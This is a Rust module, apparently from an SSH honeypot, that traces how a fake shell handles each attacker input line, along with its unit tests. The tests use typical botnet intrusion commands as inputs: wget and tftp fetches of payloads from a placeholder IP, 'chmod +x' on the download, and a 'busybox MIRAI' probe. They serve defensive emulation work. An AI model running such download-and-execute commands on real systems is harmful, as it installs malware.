//! The internal trace: what the shell engine decided while running one input line. It is an
//! operator and test channel only. Attacker-facing bytes come solely from `CommandResult`, and no
//! constructor or fold of `CommandResult` takes a trace type, so nothing here can reach a socket;
//! `no_trace_byte_reaches_output` and `trace_type_never_feeds_wire_output` (sensor-ssh's
//! `tests/shell_test.rs`) hold that line.

use super::ControlOp;

/// Everything the engine decided while running ONE input line. Held on the shell (current line
/// only), surfaced to the operator through `tracing` and to tests through
/// `FakeShell::last_trace`.
#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize)]
pub struct LineTrace {
    /// The decoded (post-XOR) line. The raw pre-codec text is already on the command_exec event.
    pub decoded: String,
    pub xor_key: Option<u8>,
    /// True when `is_binary_line` suppressed per-line events (the flood path).
    pub binary_line: bool,
    /// One entry per control segment, in execution order.
    pub segments: Vec<SegmentTrace>,
    /// Whole-line budget outcome.
    pub budget: BudgetTrace,
    /// The events this line emitted, in order: a log of the events, not the events.
    pub events: Vec<TraceEventKind>,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct SegmentTrace {
    pub op: ControlOp,
    pub decision: RunDecision,
    /// `None` when the segment was empty or short-circuited.
    pub command: Option<CommandTrace>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum RunDecision {
    Ran,
    SkippedByAnd,
    SkippedByOr,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct CommandTrace {
    /// The simple command's whitespace tokens, redirections included.
    pub tokens: Vec<String>,
    pub node: ParseNode,
    pub resolved: HandlerId,
    pub status: u8,
    pub fs_effects: Vec<FsEffect>,
    /// Re-entrant dispatch (a busybox applet, `sh -c`): the inner command's own trace. The
    /// nesting of this Vec mirrors the call stack.
    pub reentry: Vec<CommandTrace>,
}

/// Coarse parse-node kinds the engine distinguishes today; the grammar step adds variants.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum ParseNode {
    Simple,
    /// A command made only of redirections (`>/tmp/x`).
    RedirectionOnly,
    /// A pipeline, answered by its first stage only.
    Pipeline,
}

/// The dispatch decision, one variant per behavioural arm of `FakeShell::dispatch`. Argument
/// guards (`echo $0`, `enable` under bash, a slashed path token) are distinct variants, so the
/// variant fully determines the arm.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum HandlerId {
    Uname,
    Id,
    Whoami,
    Pwd,
    EchoArgv0,
    Echo,
    Cat,
    Ls,
    Mount,
    EnableBuiltin,
    EnableNotFound,
    TrueColon,
    False,
    Wget,
    Curl,
    Ping,
    ShellSpawn,
    Busybox,
    /// `tftp` and `ftpget`.
    Fetcher,
    Chmod,
    Cp,
    Rm,
    Mkdir,
    Sleep,
    Cd,
    Su,
    Exit,
    Logout,
    PathInvoke,
    NotFound,
    /// What `dispatch` does with an empty argv. The trace labels a redirection-only command
    /// `RedirectionOnly` instead, so this is the decision, not what `CommandTrace::resolved`
    /// carries for `>/tmp/x`.
    Empty,
    RedirectionOnly,
}

/// A filesystem effect an arm caused, recorded where the shell calls into `FakeFs`.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub enum FsEffect {
    Created { path: String, bytes: usize },
    Wrote { path: String, bytes: usize },
    Removed { path: String, existed: bool },
    MadeDir { path: String },
    MarkedExecutable { path: String },
    Denied { path: String, why: FsDenied },
}

/// `FsError`, without the payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum FsDenied {
    NoSuchDirectory,
    ReadOnly,
    Exists,
    NoSuchFile,
    IsADirectory,
    NotADirectory,
    TooManyLinks,
    NoSpace,
    FileTooLarge,
    NameTooLong,
}

impl From<&crate::fakefs::FsError> for FsDenied {
    fn from(error: &crate::fakefs::FsError) -> Self {
        use crate::fakefs::FsError;
        match error {
            FsError::NoSuchDirectory(_) => Self::NoSuchDirectory,
            FsError::ReadOnly => Self::ReadOnly,
            FsError::Exists => Self::Exists,
            FsError::NoSuchFile => Self::NoSuchFile,
            FsError::IsADirectory => Self::IsADirectory,
            FsError::NotADirectory => Self::NotADirectory,
            FsError::TooManyLinks => Self::TooManyLinks,
            FsError::NoSpace => Self::NoSpace,
            FsError::FileTooLarge => Self::FileTooLarge,
            FsError::NameTooLong => Self::NameTooLong,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum TraceEventKind {
    CommandExec,
    FileDownload,
    FloodBinary,
    FloodCommandCap,
    FloodDownloadCap,
}

/// What the line cost against the per-line and per-connection budgets.
#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize)]
pub struct BudgetTrace {
    /// Steps plus bytes scanned or produced, charged to the line's work budget.
    pub work_charged: u64,
    /// The deepest re-entrant dispatch the line reached.
    pub max_depth_reached: u32,
    /// The first cap the line ran into, if any. Later ones are not recorded.
    pub hit: Option<BudgetHit>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
pub enum BudgetHit {
    Work,
    Depth,
    DownloadPerLine,
    OwnedBytes,
    Nodes,
}

impl CommandTrace {
    pub(super) fn open(tokens: &[&str], node: ParseNode, resolved: HandlerId) -> Self {
        Self {
            tokens: tokens.iter().map(|t| (*t).to_string()).collect(),
            node,
            resolved,
            status: 0,
            fs_effects: Vec::new(),
            reentry: Vec::new(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fakefs::FakeFs;
    use crate::shell::{EmitContext, FakeShell};

    fn ctx() -> EmitContext {
        EmitContext {
            source_ip: "203.0.113.7".parse().unwrap(),
            wan_ip: None,
            authenticated: true,
            protocol_label: "ssh".to_string(),
            session_id: None,
        }
    }

    fn shell() -> FakeShell {
        FakeShell::new(FakeFs::new(), ctx())
    }

    fn android() -> FakeShell {
        FakeShell::android(FakeFs::android(), ctx())
    }

    /// The single command a one-segment line ran.
    fn only_command(sh: &FakeShell) -> &CommandTrace {
        let trace = sh.last_trace();
        assert_eq!(trace.segments.len(), 1, "{trace:?}");
        trace.segments[0].command.as_ref().expect("segment ran")
    }

    #[test]
    fn trace_covers_the_current_line_only() {
        let mut sh = shell();
        sh.handle_input("echo first");
        sh.handle_input("echo second; echo third");
        let trace = sh.last_trace();
        assert_eq!(trace.decoded, "echo second; echo third");
        assert_eq!(trace.segments.len(), 2);
        assert_eq!(trace.events, vec![TraceEventKind::CommandExec]);
    }

    #[test]
    fn short_circuited_segments_are_recorded_without_a_command() {
        let mut sh = shell();
        sh.handle_input("false && echo x");
        let segments = &sh.last_trace().segments;
        assert_eq!(segments[0].decision, RunDecision::Ran);
        assert_eq!(segments[0].op, ControlOp::Seq);
        assert_eq!(segments[0].command.as_ref().unwrap().status, 1);
        assert_eq!(segments[1].decision, RunDecision::SkippedByAnd);
        assert_eq!(segments[1].op, ControlOp::And);
        assert!(segments[1].command.is_none());

        sh.handle_input("true || echo x");
        let segments = &sh.last_trace().segments;
        assert_eq!(segments[1].decision, RunDecision::SkippedByOr);
        assert!(segments[1].command.is_none());

        sh.handle_input("false || true");
        let segments = &sh.last_trace().segments;
        assert_eq!(segments[1].decision, RunDecision::Ran);
        assert_eq!(
            segments[1].command.as_ref().unwrap().resolved,
            HandlerId::TrueColon
        );
    }

    #[test]
    fn redirection_only_command_records_the_created_file() {
        let mut sh = shell();
        let (out, _) = sh.handle_input(">/tmp/x");
        assert!(out.is_empty());
        let command = only_command(&sh);
        assert_eq!(command.node, ParseNode::RedirectionOnly);
        assert_eq!(command.resolved, HandlerId::RedirectionOnly);
        assert_eq!(
            command.fs_effects,
            vec![FsEffect::Created {
                path: "/tmp/x".to_string(),
                bytes: 0
            }]
        );
    }

    #[test]
    fn refused_redirection_records_the_denial_and_status() {
        let mut sh = android();
        let (out, _) = sh.handle_input(">/system/x");
        assert!(out.contains("Read-only file system"));
        let command = only_command(&sh);
        assert_eq!(command.status, 1);
        assert_eq!(
            command.fs_effects,
            vec![FsEffect::Denied {
                path: "/system/x".to_string(),
                why: FsDenied::ReadOnly
            }]
        );
    }

    #[test]
    fn redirected_output_records_the_write() {
        let mut sh = shell();
        sh.handle_input("echo hi > /tmp/o");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![
                FsEffect::Created {
                    path: "/tmp/o".to_string(),
                    bytes: 0
                },
                FsEffect::Wrote {
                    path: "/tmp/o".to_string(),
                    bytes: 3
                },
            ]
        );
    }

    #[test]
    fn a_pipeline_is_traced_as_its_first_stage() {
        let mut sh = shell();
        sh.handle_input("echo a | cat");
        let command = only_command(&sh);
        assert_eq!(command.node, ParseNode::Pipeline);
        assert_eq!(command.resolved, HandlerId::Echo);
        assert_eq!(command.tokens, vec!["echo", "a"]);
    }

    #[test]
    fn filesystem_arms_record_their_effects() {
        let mut sh = shell();
        let path = |p: &str| p.to_string();

        sh.handle_input("mkdir /tmp/d");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::MadeDir {
                path: path("/tmp/d")
            }]
        );
        sh.handle_input("mkdir /tmp/d");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::Denied {
                path: path("/tmp/d"),
                why: FsDenied::Exists
            }]
        );

        sh.handle_input("wget -q http://203.0.113.9/p.bin");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::Wrote {
                path: path("/root/p.bin"),
                bytes: crate::shell::FETCHED_BODY.len()
            }]
        );

        sh.handle_input("chmod +x /root/p.bin");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::MarkedExecutable {
                path: path("/root/p.bin")
            }]
        );

        sh.handle_input("cp /root/p.bin /tmp/q");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::Wrote {
                path: path("/tmp/q"),
                bytes: crate::shell::FETCHED_BODY.len()
            }]
        );

        sh.handle_input("rm /tmp/q");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::Removed {
                path: path("/tmp/q"),
                existed: true
            }]
        );
        sh.handle_input("rm -f /tmp/q");
        assert_eq!(
            only_command(&sh).fs_effects,
            vec![FsEffect::Removed {
                path: path("/tmp/q"),
                existed: false
            }]
        );
    }

    #[test]
    fn every_dispatch_arm_resolves_to_its_own_handler() {
        let linux: &[(&str, HandlerId)] = &[
            ("uname -a", HandlerId::Uname),
            ("id", HandlerId::Id),
            ("whoami", HandlerId::Whoami),
            ("pwd", HandlerId::Pwd),
            ("echo $0", HandlerId::EchoArgv0),
            ("echo hi", HandlerId::Echo),
            ("cat /etc/hostname", HandlerId::Cat),
            ("ls /", HandlerId::Ls),
            ("mount", HandlerId::Mount),
            ("enable", HandlerId::EnableBuiltin),
            ("true", HandlerId::TrueColon),
            (":", HandlerId::TrueColon),
            ("false", HandlerId::False),
            ("wget -q http://203.0.113.9/x", HandlerId::Wget),
            ("curl http://203.0.113.9/x", HandlerId::Curl),
            ("ping -c1 203.0.113.9", HandlerId::Ping),
            ("sh", HandlerId::ShellSpawn),
            ("/bin/bash", HandlerId::ShellSpawn),
            ("ash", HandlerId::ShellSpawn),
            ("/bin/busybox X", HandlerId::Busybox),
            ("tftp -g -r f 203.0.113.9", HandlerId::Fetcher),
            ("ftpget 203.0.113.9 f", HandlerId::Fetcher),
            ("chmod 777 /tmp", HandlerId::Chmod),
            ("cp /etc/hostname /tmp/h", HandlerId::Cp),
            ("rm -f /tmp/zz", HandlerId::Rm),
            ("mkdir /tmp/m", HandlerId::Mkdir),
            ("sleep 1", HandlerId::Sleep),
            ("cd /tmp", HandlerId::Cd),
            ("su", HandlerId::Su),
            ("exit", HandlerId::Exit),
            ("logout", HandlerId::Logout),
            ("/tmp/none", HandlerId::PathInvoke),
            ("nosuchcmd", HandlerId::NotFound),
            (">/tmp/x", HandlerId::RedirectionOnly),
        ];
        for (line, want) in linux {
            let mut sh = shell();
            sh.handle_input(line);
            assert_eq!(only_command(&sh).resolved, *want, "{line}");
        }

        // `enable` outside bash is not a builtin.
        let mut sh = android();
        sh.handle_input("enable");
        assert_eq!(only_command(&sh).resolved, HandlerId::EnableNotFound);

        // The empty-argv decision itself, which the trace relabels for redirections.
        assert_eq!(shell().resolve_handler(&[]), HandlerId::Empty);
    }

    #[test]
    fn reentrant_dispatch_nests_under_its_caller() {
        let mut sh = shell();
        sh.handle_input("/bin/busybox echo hi");
        let outer = only_command(&sh);
        assert_eq!(outer.resolved, HandlerId::Busybox);
        assert_eq!(outer.reentry.len(), 1);
        assert_eq!(outer.reentry[0].resolved, HandlerId::Echo);
        assert_eq!(outer.reentry[0].tokens, vec!["echo", "hi"]);

        sh.handle_input("busybox sh -c \"id\"");
        let outer = only_command(&sh);
        assert_eq!(outer.reentry[0].resolved, HandlerId::ShellSpawn);
        assert_eq!(outer.reentry[0].reentry[0].resolved, HandlerId::Id);

        sh.handle_input("busybox NOSUCH");
        assert!(only_command(&sh).reentry.is_empty());
    }

    #[test]
    fn events_are_logged_in_emission_order() {
        let mut sh = shell();
        sh.handle_input("wget http://203.0.113.9/a.sh");
        assert_eq!(
            sh.last_trace().events,
            vec![TraceEventKind::CommandExec, TraceEventKind::FileDownload]
        );

        let mut sh = shell();
        sh.handle_input("\u{1}\u{2}\u{3}\u{4}\u{5}");
        assert!(sh.last_trace().binary_line);
        assert_eq!(sh.last_trace().events, vec![TraceEventKind::FloodBinary]);
        sh.handle_input("\u{1}\u{2}\u{3}\u{4}\u{5}");
        assert!(sh.last_trace().events.is_empty(), "the marker is one-shot");

        let mut sh = shell();
        for _ in 0..256 {
            sh.handle_input("true");
        }
        sh.handle_input("true");
        assert_eq!(
            sh.last_trace().events,
            vec![TraceEventKind::FloodCommandCap]
        );
        sh.handle_input("true");
        assert!(sh.last_trace().events.is_empty());
    }

    #[test]
    fn no_trace_byte_reaches_output() {
        let vocabulary = [
            "Busybox",
            "NotFound",
            "PathInvoke",
            "RedirectionOnly",
            "ShellSpawn",
            "TrueColon",
            "SkippedByAnd",
            "SkippedByOr",
            "RunDecision",
            "Created",
            "Wrote",
            "MadeDir",
            "Denied",
            "NoSpace",
            "ReadOnly",
            "FileDownload",
            "FloodBinary",
            "CommandExec",
            "resolved",
            "fs_effects",
            "reentry",
            "work_charged",
            "BudgetHit",
            "segments",
        ];
        let lines = [
            "false && echo skipped || echo done",
            ">/tmp/x",
            "/bin/busybox MIRAI",
            "sh -c \"id\"",
            "busybox sh -c \"id\"",
            "wget http://203.0.113.9/a.sh",
            "cp /nonexistent /tmp/y",
            "\u{1}\u{2}\u{3}\u{4}\u{5}",
        ];
        let mut sh = shell();
        for line in lines {
            let (out, events) = sh.handle_input(line);
            let text = String::from_utf8_lossy(out.bytes()).into_owned();
            let event_text = format!("{events:?}");
            for token in vocabulary {
                assert!(!text.contains(token), "{line:?} leaked {token:?}: {text:?}");
                assert!(
                    !out.bytes()
                        .windows(token.len())
                        .any(|w| w == token.as_bytes()),
                    "{line:?} leaked {token:?}"
                );
                assert!(
                    !event_text.contains(token),
                    "{line:?} event leaked {token:?}"
                );
            }
        }

        // Positive control: the reply is there and the trace is populated, in the same run.
        let mut sh = shell();
        let (out, _) = sh.handle_input("false && echo skipped || echo done");
        assert!(out.ends_with("done\n"));
        assert_eq!(
            sh.last_trace().segments[1].decision,
            RunDecision::SkippedByAnd
        );
        let (out, _) = sh.handle_input(">/tmp/x");
        assert!(out.is_empty());
        assert!(matches!(
            only_command(&sh).fs_effects.as_slice(),
            [FsEffect::Created { .. }]
        ));
    }
}
